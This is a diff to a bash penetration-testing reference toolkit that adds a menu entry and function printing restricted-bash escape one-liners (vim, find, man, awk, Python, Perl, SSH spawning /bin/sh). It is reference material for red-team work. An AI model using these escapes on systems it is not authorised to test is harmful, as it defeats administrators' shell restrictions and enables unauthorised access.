@@ -3,7 +3,7 @@
 # TODO: Extracting URLs from a Web Page - Web and Internet Users (177) - Chapter 7 - Wicked Cool Scripts
 
 # Version
-VERSION="0.17.0"
+VERSION="0.18.0"
 # Darth Release
 RELEASE="ANAKIN"
 #* ====== CONSTANTS ======
@@ -321,7 +321,7 @@ RELEASE="ANAKIN"
         echo -e "${GREEN} [14] find Examples (Quick Ref) (Linux OS) ${RESET}"
         echo -e "${GREEN} [15] Root Password Reset Guide (Linux OS) ${RESET}"
         echo -e "${GREEN} [16] How to Use VIm (Quick Ref) ${RESET}"
-        echo -e "${GRAY} [17] Escape Techniques for rbash (Testing) ${RESET}"
+        echo -e "${GREEN} [17] Rbash Escape Techniques (Linux OS)${RESET}"
         echo -e "${GRAY} [18] Wireless Network Attacks ${RESET}"
         echo -e "${GRAY} [19] Windows Tips ${RESET}"
         echo -e "${GRAY} [20] Create Scripts in .bat or .ps1 ${RESET}"
@@ -375,7 +375,8 @@ RELEASE="ANAKIN"
                 13) find_based_attack_surface_analysis ;;  
                 14) find_command_examples ;;
                 15) linux_root_password_reset ;; 
-                16) vim_quick_reference ;;  
+                16) vim_quick_reference ;;
+                17) rbash_escape_methods ;;  
                 18) xviii_wifi_attacks ;;  
                 19) xix_windows_basic_commands ;;  
                 21) xxi_sgt_domingues_scanning_script ;;  
@@ -2662,7 +2663,101 @@ RELEASE="ANAKIN"
         # Start the Vim usage reminder workflow
         vim_quick_reference_workflow
     }
-    
+
+    # Function: Quick Reference for Escaping Restricted Bash (rbash)
+    function rbash_escape_methods() {
+        # rbash_escape_methods - Quick Reference Guide for rbash Escape Techniques
+            #
+            # Description:
+            #   Provides a quick reference for escaping rbash environments.
+            #   - Lists multiple techniques: Vim, Find, Man, Python, SSH, etc.
+            #   - The operator manually executes commands (no automatic execution).
+            #
+            # Features:
+            #   - Covers common escape methods with structured formatting
+            #   - Provides manual execution commands for safety
+            #   - Useful for Red Team operations and penetration testing
+            #
+            # Usage:
+            #   Run this function to display known rbash escape techniques.
+            #
+            # Author: R3v4N (w/GPT)
+            # Created on: 2025-01-26
+            # Last Updated: 2025-01-30
+            # Version: 2.0
+            #
+            # Notes:
+            #   - Some methods may not work depending on system restrictions.
+            #   - Use this as a **manual reference**, NOT an automated escape.
+
+        title="RBASH ESCAPE TECHNIQUES"
+
+        function display_rbash_header() {
+            display_banner_inside_functions
+            echo -e "${YELLOW}These methods might help bypass restricted shells.${RESET}\n"
+        }
+
+        function escape_vim() {
+            echo -e "${YELLOW}Escape via Vim:${RESET}"
+            echo -e "1. Open Vim: ${GREEN}vim${RESET}"
+            echo -e "2. Enter command mode: ${GREEN}:!sh${RESET}"
+            echo -e "3. If successful, you'll get a shell!\n"
+        }
+
+        function escape_find() {
+            echo -e "${YELLOW}Escape via find:${RESET}"
+            echo -e "Run the following command:"
+            echo -e "${GREEN}find . -exec /bin/sh \; -quit${RESET}\n"
+        }
+
+        function escape_man() {
+            echo -e "${YELLOW}Escape via man:${RESET}"
+            echo -e "Run: ${GREEN}man man${RESET}, then type: ${GREEN}!sh${RESET}\n"
+        }
+
+        function escape_awk() {
+            echo -e "${YELLOW}Escape via awk:${RESET}"
+            echo -e "Try: ${GREEN}awk 'BEGIN {system(\"/bin/sh\")}'${RESET}\n"
+        }
+
+        function escape_python() {
+            echo -e "${YELLOW}Escape via Python:${RESET}"
+            echo -e "If Python is available, run:"
+            echo -e "${GREEN}python -c 'import pty; pty.spawn(\"/bin/sh\")'${RESET}\n"
+        }
+
+        function escape_perl() {
+            echo -e "${YELLOW}Escape via Perl:${RESET}"
+            echo -e "Try: ${GREEN}perl -e 'exec \"/bin/sh\"; '${RESET}\n"
+        }
+
+        function escape_ssh() {
+            echo -e "${YELLOW}Escape via SSH:${RESET}"
+            echo -e "If SSH access is available, try:"
+            echo -e "${GREEN}ssh user@target bash --noprofile${RESET}\n"
+        }
+
+        function display_rbash_footer() {
+            echo -e "${GREEN}===================================================${RESET}"
+            exit_to_main_menu
+        }
+
+        # Execute the workflow
+        function rbash_escape_workflow() {
+            display_rbash_header
+            escape_vim
+            escape_find
+            escape_man
+            escape_awk
+            escape_python
+            escape_perl
+            escape_ssh
+            display_rbash_footer
+        }
+
+        rbash_escape_workflow
+    }
+
 
 
 
